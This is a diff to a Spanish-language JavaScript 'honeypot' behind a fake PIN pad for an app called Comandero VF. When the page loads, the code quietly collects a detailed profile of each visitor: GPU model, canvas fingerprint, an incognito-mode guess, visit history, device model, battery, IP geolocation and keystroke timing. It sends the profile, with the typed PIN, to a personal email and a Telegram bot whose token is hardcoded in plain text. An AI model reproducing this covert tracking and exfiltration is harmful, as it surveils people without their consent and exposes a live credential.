@@ -1,29 +1,124 @@
 // ============================================================================
-// HONEYPOT / TRAMPA DE SEGURIDAD - COMANDERO VF
+// HONEYPOT / TRAMPA DE SEGURIDAD AVANZADA - COMANDERO VF
 // ============================================================================
 
 const DEST_EMAIL = 'jongt23@gmail.com';
-
-// Opcional: Si tienes un bot de Telegram, pon tu TOKEN y CHAT ID aquí
 const TELEGRAM_BOT_TOKEN = '8650497450:AAFB-QkgD8WmrlJsG0EhvMF0wICrECwPS-8';
 const TELEGRAM_CHAT_ID   = '32759013';
 
 let pinBuffer = '';
+let pinTimestamps = [];
 let datosDispositivo = {};
 let ipData = {};
-let yaEnviado = false;
 
-// ── 1. RECOPILACIÓN SILENCIOSA AL CARGAR LA PÁGINA ────────────────────────────
+// ── 1. EXTRACCIÓN AVANZADA DE HUELLA DIGITAL (FINGERPRINTING) ──────────────────
+
+// A. Modelo exacto de GPU / Tarjeta Gráfica (revela modelo exacto de teléfono/PC)
+function obtenerGPU() {
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (!gl) return { vendor: 'N/A', renderer: 'N/A' };
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    if (!debugInfo) return { vendor: 'N/A', renderer: 'N/A' };
+    return {
+      vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A',
+      renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A'
+    };
+  } catch (_) {
+    return { vendor: 'N/A', renderer: 'N/A' };
+  }
+}
+
+// B. Canvas Fingerprint (Identificador único de hardware)
+function obtenerCanvasFingerprint() {
+  try {
+    const canvas = document.createElement('canvas');
+    canvas.width = 200;
+    canvas.height = 50;
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px "Arial"';
+    ctx.textBaseline = 'alphabetic';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = '#069';
+    ctx.fillText('Comandero, 2.7!', 2, 15);
+    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+    ctx.fillText('Comandero, 2.7!', 4, 17);
+    const dataURI = canvas.toDataURL();
+    let hash = 0;
+    for (let i = 0; i < dataURI.length; i++) {
+      hash = ((hash << 5) - hash) + dataURI.charCodeAt(i);
+      hash |= 0;
+    }
+    return 'FP-' + Math.abs(hash).toString(16).toUpperCase();
+  } catch (_) {
+    return 'N/A';
+  }
+}
+
+// C. Detección de Modo Incógnito / Navegación Privada
+async function detectarModoIncognito() {
+  try {
+    if ('storage' in navigator && 'estimate' in navigator.storage) {
+      const { quota } = await navigator.storage.estimate();
+      // En modo privado la cuota suele ser muy reducida (< 120MB en Chrome o restringida)
+      if (quota && quota < 120000000) return 'Probable modo Incógnito';
+    }
+    return 'Navegación normal';
+  } catch (_) {
+    return 'Desconocido';
+  }
+}
+
+// D. Historial de accesos acumulados en este navegador
+function gestionarContadorVisitas() {
+  try {
+    let visitas = parseInt(localStorage.getItem('_cmd_v_count') || '0') + 1;
+    localStorage.setItem('_cmd_v_count', visitas.toString());
+    
+    let primeraVez = localStorage.getItem('_cmd_first_seen');
+    if (!primeraVez) {
+      primeraVez = new Date().toLocaleString('es-ES');
+      localStorage.setItem('_cmd_first_seen', primeraVez);
+    }
+    return { visitasTotales: visitas, primeraVisita: primeraVez };
+  } catch (_) {
+    return { visitasTotales: 'Cookies/Storage bloqueado', primeraVisita: 'N/A' };
+  }
+}
+
+// ── 2. RECOPILACIÓN SILENCIOSA AL CARGAR LA PÁGINA ────────────────────────────
 async function recopilarDatosIniciales() {
   try {
-    // Información básica del navegador y hardware
+    const gpu = obtenerGPU();
+    const fingerprint = obtenerCanvasFingerprint();
+    const modoIncognito = await detectarModoIncognito();
+    const historial = gestionarContadorVisitas();
+
+    // Modelo comercial exacto si el navegador lo soporta (Client Hints)
+    let modeloComercial = 'N/A';
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+      try {
+        const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
+        if (hints.model) modeloComercial = `${hints.model} (${hints.platform} ${hints.platformVersion || ''})`;
+      } catch (_) {}
+    }
+
     datosDispositivo = {
+      modeloComercial,
+      gpuRenderer: gpu.renderer,
+      gpuVendor: gpu.vendor,
+      canvasFingerprint: fingerprint,
+      modoIncognito,
+      visitasRegistradas: `${historial.visitasTotales} (Primera vez: ${historial.primeraVisita})`,
       userAgent: navigator.userAgent,
-      platform: navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || 'Desconocida',
+      platform: navigator.platform || 'Desconocida',
       language: navigator.language || (navigator.languages && navigator.languages[0]) || 'Desconocido',
       languages: (navigator.languages || []).join(', '),
       timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Desconocida',
-      screenResolution: `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio || 1})`,
+      screenResolution: `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio || 1}, Color: ${window.screen.colorDepth}-bit)`,
       viewportSize: `${window.innerWidth}x${window.innerHeight}`,
       touchPoints: navigator.maxTouchPoints || 0,
       coresCPU: navigator.hardwareConcurrency || 'N/A',
@@ -58,7 +153,6 @@ async function recopilarDatosIniciales() {
 }
 
 async function obtenerGeoIP() {
-  // Intentamos obtener IP + detalles de ubicación mediante ipwho.is o ipapi.co
   try {
     const res = await fetch('https://ipwho.is/', { cache: 'no-store' });
     const data = await res.json();
@@ -90,33 +184,43 @@ async function obtenerGeoIP() {
   } catch (_) {}
 }
 
-// ── 2. ENVÍO DE ALERTAS ───────────────────────────────────────────────────────
+// ── 3. ENVÍO DE ALERTAS ───────────────────────────────────────────────────────
 async function enviarAlerta(pinProbado) {
   const fechaActual = new Date().toLocaleString('es-ES', { timeZoneName: 'short' });
   const ipTexto = ipData.ip || 'No detectada';
   const ubicacionTexto = (ipData.ciudad ? `${ipData.ciudad}, ${ipData.region} (${ipData.pais})` : 'Desconocida');
   const mapaUrl = (ipData.latitud && ipData.longitud) ? `https://www.google.com/maps?q=${ipData.latitud},${ipData.longitud}` : 'N/A';
 
+  // Calcular cadencia y velocidad de tecleo del PIN
+  let velocidadTecleo = 'N/A';
+  if (pinTimestamps.length >= 2) {
+    const totalMs = pinTimestamps[pinTimestamps.length - 1] - pinTimestamps[0];
+    velocidadTecleo = `${totalMs} ms en teclear los 4 dígitos`;
+  }
+
   const cuerpoInforme = {
-    _subject: `🚨 ALERTA INTRUSO COMANDERO - PIN Probado: [${pinProbado}] - IP: ${ipTexto}`,
+    _subject: `🚨 ALERTA INTRUSO COMANDERO - PIN: [${pinProbado}] - IP: ${ipTexto}`,
     _template: 'table',
     _captcha: 'false',
     PIN_PROBADO: pinProbado,
     FECHA_HORA: fechaActual,
     IP_PUBLICA: ipTexto,
     UBICACION_APROX: ubicacionTexto,
-    ISP_PROVEEDOR: ipData.isp || 'N/A',
+    ISP_OPERADOR: ipData.isp || 'N/A',
     COORDENADAS_MAPA: mapaUrl,
-    DISPOSITIVO_USER_AGENT: datosDispositivo.userAgent || 'N/A',
-    SISTEMA_OPERATIVO: datosDispositivo.platform || 'N/A',
+    MODELO_DISPOSITIVO: datosDispositivo.modeloComercial !== 'N/A' ? datosDispositivo.modeloComercial : datosDispositivo.platform,
+    CHIP_GRAFICA_GPU: datosDispositivo.gpuRenderer || 'N/A',
+    HUELLA_HARDWARE_ID: datosDispositivo.canvasFingerprint || 'N/A',
+    MODO_NAVEGACION: datosDispositivo.modoIncognito || 'N/A',
+    HISTORIAL_VISITAS_LOCALES: datosDispositivo.visitasRegistradas || 'N/A',
+    VELOCIDAD_TECLEO: velocidadTecleo,
     RESOLUCION_PANTALLA: datosDispositivo.screenResolution || 'N/A',
-    PANTALLA_TACTIL: datosDispositivo.touchPoints > 0 ? `Sí (${datosDispositivo.touchPoints} puntos)` : 'No / Ratón',
+    PANTALLA_TACTIL: datosDispositivo.touchPoints > 0 ? `Sí (${datosDispositivo.touchPoints} puntos táctiles)` : 'No / Ratón',
     BATERIA: datosDispositivo.bateriaNivel ? `${datosDispositivo.bateriaNivel} (Cargando: ${datosDispositivo.bateriaCargando})` : 'N/A',
     CONEXION_RED: datosDispositivo.conexionTipo || 'N/A',
-    IDIOMA_NAVEGADOR: datosDispositivo.language || 'N/A',
-    ZONA_HORARIA: datosDispositivo.timeZone || 'N/A',
-    URL_ORIGEN: datosDispositivo.urlAcceso || 'N/A',
-    REFERRER: datosDispositivo.referrer || 'N/A'
+    IDIOMA_Y_ZONA: `${datosDispositivo.language} | ${datosDispositivo.timeZone}`,
+    USER_AGENT_COMPLETO: datosDispositivo.userAgent || 'N/A',
+    URL_ORIGEN: datosDispositivo.urlAcceso || 'N/A'
   };
 
   // 1. Enviar por Email mediante FormSubmit (AJAX JSON)
@@ -133,18 +237,27 @@ async function enviarAlerta(pinProbado) {
     console.error("Error enviando email honeypot:", e);
   }
 
-  // 2. Enviar por Telegram Bot (si está configurado)
+  // 2. Enviar por Telegram Bot en tiempo real
   if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
     try {
-      const msgTelegram = `🚨 <b>ALERTA HONEYPOT COMANDERO</b>\n\n` +
-        `🔑 <b>PIN probado:</b> <code>${pinProbado}</code>\n` +
-        `🌐 <b>IP:</b> <code>${ipTexto}</code>\n` +
+      const modeloStr = datosDispositivo.modeloComercial !== 'N/A' 
+        ? datosDispositivo.modeloComercial 
+        : datosDispositivo.platform;
+
+      const msgTelegram = `🚨 <b>¡INTRUSO CAZADO EN COMANDERO!</b>\n\n` +
+        `🔑 <b>PIN Probado:</b> <code>${pinProbado}</code>\n` +
+        `⏱ <b>Velocidad:</b> ${velocidadTecleo}\n\n` +
+        `🌐 <b>IP Pública:</b> <code>${ipTexto}</code>\n` +
         `📍 <b>Ubicación:</b> ${ubicacionTexto}\n` +
-        `🏢 <b>ISP / Operador:</b> ${ipData.isp || 'N/A'}\n` +
-        `📱 <b>Dispositivo:</b> ${datosDispositivo.platform || 'N/A'}\n` +
-        `🔋 <b>Batería:</b> ${datosDispositivo.bateriaNivel || 'N/A'}\n` +
-        `🗺 <b>Mapa:</b> ${mapaUrl}\n` +
-        `⏰ <b>Hora:</b> ${fechaActual}`;
+        `🏢 <b>ISP / Compañía:</b> ${ipData.isp || 'N/A'}\n` +
+        `🗺 <b>Google Maps:</b> ${mapaUrl}\n\n` +
+        `📱 <b>Dispositivo:</b> ${modeloStr}\n` +
+        `🎮 <b>GPU / Gráfica:</b> <code>${datosDispositivo.gpuRenderer || 'N/A'}</code>\n` +
+        `🧬 <b>Huella Hardware:</b> <code>${datosDispositivo.canvasFingerprint}</code>\n` +
+        `🕵️ <b>Navegación:</b> ${datosDispositivo.modoIncognito}\n` +
+        `👁 <b>Visitas del terminal:</b> ${datosDispositivo.visitasRegistradas}\n` +
+        `🔋 <b>Batería:</b> ${datosDispositivo.bateriaNivel || 'N/A'} (Cargando: ${datosDispositivo.bateriaCargando || 'N/A'})\n` +
+        `⏰ <b>Fecha:</b> ${fechaActual}`;
 
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -161,7 +274,7 @@ async function enviarAlerta(pinProbado) {
   }
 }
 
-// ── 3. MANEJO DEL TECLADO PIN Y SIMULACIÓN ─────────────────────────────────────
+// ── 4. MANEJO DEL TECLADO PIN Y SIMULACIÓN ─────────────────────────────────────
 function updatePinDots(error) {
   for (let i = 0; i < 4; i++) {
     const dot = document.getElementById('pd' + i);
@@ -174,6 +287,7 @@ function updatePinDots(error) {
 window.pinKey = async d => {
   if (pinBuffer.length >= 4) return;
   pinBuffer += d;
+  pinTimestamps.push(Date.now());
   updatePinDots(false);
 
   if (pinBuffer.length === 4) {
@@ -183,6 +297,7 @@ window.pinKey = async d => {
 
 window.pinDel = () => {
   pinBuffer = pinBuffer.slice(0, -1);
+  pinTimestamps.pop();
   updatePinDots(false);
   const err = document.getElementById('pin-error');
   if (err) err.style.display = 'none';
@@ -215,6 +330,7 @@ async function procesarIntentoPin(pin) {
 
   setTimeout(() => {
     pinBuffer = '';
+    pinTimestamps = [];
     updatePinDots(false);
   }, 1000);
 }
